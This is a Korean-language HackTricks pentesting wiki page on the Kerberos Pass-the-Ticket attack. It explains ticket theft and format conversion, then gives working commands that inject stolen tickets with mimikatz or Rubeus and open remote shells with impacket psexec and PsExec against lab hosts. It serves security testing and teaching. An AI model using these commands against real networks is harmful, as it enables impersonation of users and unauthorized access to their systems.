# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

**Pass The Ticket (PTT)** attack method에서는 공격자가 password나 hash values 대신 **사용자의 authentication ticket을 탈취**합니다. 이렇게 탈취한 ticket은 **사용자를 사칭**하고 network 내의 resources와 services에 unauthorized access를 얻는 데 사용됩니다.<sup>[[1]](#references)</sup>

**읽기**:

- [Windows에서 ticket 수집](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux에서 ticket 수집](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Linux와 Windows ticket을 플랫폼 간에 교환**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) tool은 ticket 자체와 output file만 사용하여 ticket formats를 변환합니다.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windows에서는 [Kekeo](https://github.com/gentilkiwi/kekeo)를 사용할 수 있습니다.

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## 참고 자료

- [1] [Kerberos (II): Kerberos를 공격하는 방법](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
